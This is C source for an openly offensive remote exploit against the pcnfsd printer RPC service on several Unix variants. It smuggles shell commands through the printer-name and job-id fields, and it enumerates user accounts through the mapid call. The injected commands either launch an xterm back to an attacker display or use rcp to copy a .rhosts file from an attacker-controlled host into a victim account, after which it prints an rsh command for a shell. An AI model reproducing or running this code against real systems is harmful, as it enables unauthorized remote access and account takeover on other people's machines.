#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <errno.h>
#include <rpc/rpc.h>
#include "pcnfsd.h"

/* 1 - xterm / 2 - rcp */
#define METHOD 2

#define XTERM "1.1.1.1:0"

/* Note: some versions of rcp require that you use a hostname instead of ip */
#define RCP "bob@shell.foobar.com"

void get_attack(char *arch);
void exploit1(void);
void exploit2(void);
int test_v2_stat(char *printer);
int test_v2_cancel(char *printer,char *user_name, char *id);
char *findprinter();
char *finduser(int us);

CLIENT *cl2;
char *server;

int attack;
char *attack_string;
char *user;

int main(int argc, char *argv[])
{
	char *transport = "udp";

	char *arch;

	if (argc <2) 
	{
		fprintf(stderr, "\nusage: %s server [arch] [user]\n\n",
			argv[0]);
		fprintf(stderr, "  arch can be: openbsd linux irix hpux sunos solaris sysv \n");
		fprintf(stderr, "  write more and send them to me ! :> \n");
		fprintf(stderr, "\n  You can specify a user with the third argument in case the sploit \n  picks a dumb one.\n\n");
		exit(1);
	}

	if (argc>=3) 
		arch=argv[2];
	else 
		arch="sysv";	

	server = argv[1];

	cl2 = clnt_create(server, PCNFSDPROG, PCNFSDV2, transport);
	if(cl2 == NULL) 
	{
		clnt_pcreateerror(server);
		exit(1);
	}

	if (argc==4)
		user=argv[3];

	get_attack(arch);

	switch (attack)
	{
		case 1: exploit1();
			break;
		case 2: exploit2();
			break;
	}

	if (METHOD==2)
		printf("\nNow try :\nrsh -l %s %s /bin/sh -i\n",user,server);
}

void get_attack(char *arch)
{
	char *evil;

	attack_string=malloc(1024);
	evil=attack_string;

	if (!strcmp(arch,"openbsd"))
	{
		attack=1;
		user="root";

		if (METHOD==1)
		{
			sprintf(evil,"\ncd /usr/X11/bin\n");
			strcat(evil,"./xterm -ut -d ");
			strcat(evil,XTERM);
			strcat(evil,"\n");  
		}
		else
		{
			sprintf(evil,"cd /usr/bin\n");
			sprintf(evil+strlen(evil),"./rcp %s:.rhosts ~root\n",RCP);
			strcat(evil,"\n");
		}
	}

	if (!strcmp(arch,"linux"))
	{
		attack=2;	

/* linux - uses cancel, gives you a user account on the machine. */

		printf("Searching for a valid account to attack.\n");
		if (!user)
		user=finduser(1);
		printf("\tUsing user: %s\n",user);

		if (METHOD==1)
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"cd usr\ncd X11\ncd bin\n");
			strcat(evil,"xterm -ut -d ");
			strcat(evil,XTERM);
			strcat(evil,"\n");  
		}
		else
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\ncd usr\n");
			strcat(evil,"cd bin\n");
			sprintf(evil+strlen(evil),"rcp %s:.rhosts ~%s\n",RCP,user);
			strcat(evil,"\n");
		}
	}

	if (!strcmp(arch,"irix"))
	{
		attack=2;	

/* irix - uses cancel, gives you a user account on the machine. */

		printf("Searching for a valid account to attack.\n");
		if (!user)
		user=finduser(1);
		printf("\tUsing user: %s\n",user);

		if (METHOD==1)
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"cd usr\ncd bin\ncd X11\n");
			strcat(evil,"xterm -ut -d ");
			strcat(evil,XTERM);
			strcat(evil,"\n");  
		}
		else
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\ncd bin\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"csh -c \"");
			strcat(evil,"cd ..\ncd ..\ncd ..\ncd usr\ncd bsd\n");
			sprintf(evil+strlen(evil),"rcp %s:.rhosts ~%s\n",RCP,user);
			strcat(evil,"\"\n");
		}
	}

	if (!strcmp(arch,"hpux"))
	{
		attack=2;	

		printf("Searching for a valid account to attack.\n");
		if (!user)
		user=finduser(1);
		printf("\tUsing user: %s\n",user);

		if (METHOD==1)
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"cd usr\ncd bin\ncd X11\n");
			strcat(evil,"xterm -ut -d ");
			strcat(evil,XTERM);
			strcat(evil,"\n");  
		}
		else
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\ncd bin\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"csh -c \"");
			strcat(evil,"cd ..\ncd ..\ncd ..\ncd usr\ncd bsd\n");
			sprintf(evil+strlen(evil),"rcp %s:.rhosts ~%s\n",RCP,user);
			strcat(evil,"\"\n");
		}
	}

	if (!strcmp(arch,"sunos"))
	{
		attack=2;	

/* Sunos - uses cancel, gives you a user account on the machine. */
/* binary looks vulnerable to the runps630 hole */

		printf("Searching for a valid account to attack.\n");
		if (!user)
		user=finduser(1);
		printf("\tUsing user: %s\n",user);

		if (METHOD==1)
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"cd usr\ncd openwin\ncd bin\n");
			strcat(evil,"xterm -ut -d ");
			strcat(evil,XTERM);
			strcat(evil,"\n");  
		}
		else
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\ncd bin\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"csh -c \"");
			strcat(evil,"cd ..\ncd ..\ncd ..\ncd usr\ncd ucb\n");
			sprintf(evil+strlen(evil),"rcp %s:.rhosts ~%s\n",RCP,user);
			strcat(evil,"\"\n");
		}
	}
	
	if (!strcmp(arch,"solaris"))
	{
		attack=2;	

/* Solaris - uses cancel, gives you a user account on the machine. */
/* older binary looks vulnerable to the runps630 hole */
/* newest version of pcnfsd is fixed to all attacks I think */

		printf("Searching for a valid account to attack.\n");
		if (!user)
		user=finduser(1);
		printf("\tUsing user: %s\n",user);

		if (METHOD==1)
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"cd usr\ncd openwin\ncd bin\n");
			strcat(evil,"xterm -ut -d ");
			strcat(evil,XTERM);
			strcat(evil,"\n");  
		}
		else
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\ncd bin\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"csh -c \"");
			strcat(evil,"cd ..\ncd ..\ncd ..\ncd bin\n");
			sprintf(evil+strlen(evil),"rcp %s:.rhosts ~%s\n",RCP,user);
			strcat(evil,"\"\n");
		}
	}

	if (!strcmp(arch,"sysv"))
	{
		attack=2;	

/* at&t sysv release 4 - root via cancel */

		printf("Using root account for attack.\n");
		user="root";
		printf("\tUsing user: %s\n",user);
	
		if (METHOD==1)
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"cd usr\ncd bin\ncd X11\n");
			strcat(evil,"xterm -ut -display ");
			strcat(evil,XTERM);
			strcat(evil,"\n");  
		}
		else
		{
			sprintf(evil,"\ncd ..\ncd ..\ncd ..\ncd ..\ncd bin\n");
			strcat(evil,"PATH=.:$PATH\nexport PATH\n");
			strcat(evil,"csh -c \"");
			strcat(evil,"cd ..\ncd ..\ncd ..\ncd bin\n");
			sprintf(evil+strlen(evil),"rcp %s:.rhosts ~%s\n",RCP,user);
			strcat(evil,"\"\n");
		}
	}
}


void exploit1(void)
{
	/* This sploit uses pr_status_2 */
	/* This will only work under bsd-ish systems, because the
	 * sysv-ish version verifies the printer name */

	printf("Attempting exploit.\n");
	test_v2_stat(attack_string);
}

void exploit2(void)
{
	char *printer;

	printf("Searching for a valid printer.\n");
	printer=findprinter();
	if (!printer)
		printer="lp";
	printf("\tUsing printer: %s\n",printer);
	test_v2_cancel(printer,user,attack_string);
}

int test_v2_stat(char *printer)
{
	v2_pr_status_args a;
	v2_pr_status_results *rp;

        a.pn = printer;
        a.cm = "-";

        printf("\ninvoking pr_status_2: %s\n",printer);

        rp = pcnfsd2_pr_status_2(&a, cl2);

        if(rp == NULL) 
	{
                clnt_perror(cl2, server);
                return(1);
        }

        printf("results: stat = %d, cm = '%s'\n",
                rp->stat, rp->cm);

        if(rp->cm)
                free(rp->cm);
        if(rp->status)
                free(rp->status);
        return(rp->stat);
}

int test_v2_cancel(char *printer,char *user_name, char *id)
{
	v2_pr_cancel_args a;
	v2_pr_cancel_results *rp;

        a.system = "blah";
        a.pn = printer;
        a.user = user_name;
        a.id = id;
        a.cm = "-";

	printf("Attempting exploit.\n");
        printf("invoking pr_cancel_2\n");
        rp = pcnfsd2_pr_cancel_2(&a, cl2);

        if(rp == NULL) 
	{
                clnt_perror(cl2, server);
                return(1);
 	}
        printf("results: stat = %d, cm = '%s'\n",
                rp->stat, rp->cm);
        if(rp->cm)
                free(rp->cm);
        return(0);
}

char *findprinter()
{
	char a;
	v2_pr_list_results *rp;
	pr_list curr;

        rp = pcnfsd2_pr_list_2(&a, cl2);

        if (rp == NULL) 
	{
                clnt_perror(cl2, server);
                return(NULL);
        }
        curr = rp->printers;
        while(curr) 
	{
                curr = curr->pr_next;
        }

	if (rp->printers)
	{
		return (rp->printers->pn);
	}
        return(NULL);
}

char *finduser(int us)
{
        v2_mapid_args a;
        struct mapreq_arg_item i[100];

        v2_mapid_results *rp;
        struct mapreq_res_item *rip;

        int j;
        int current=1;
	int bob=0;

        a.cm = "-";
        a.req_list=&(i[0]);

	for (j=0;j<100;j++)
	{
        	i[j].req=MAP_REQ_UID;
        	i[j].name="";
        	i[j].mapreq_next=&(i[j+1]);
	}
	i[99].mapreq_next=NULL;

        while ((current+=100)<=65000)
        {
		for (j=0;j<100;j++)
			i[j].id=current+j;

                rp = pcnfsd2_mapid_2(&a, cl2);

                if (rp == NULL)
                {
                        clnt_perror(cl2, server);
                        return(NULL);
                }

                rip = rp->res_list;
                while(rip && ((rip->id)<=65000))
                {
                        if (!(rip->stat))
                        {
				bob++;
				if (bob==us)
					return rip->name;
                        }
                        rip = rip->mapreq_next;
                }
        }
}
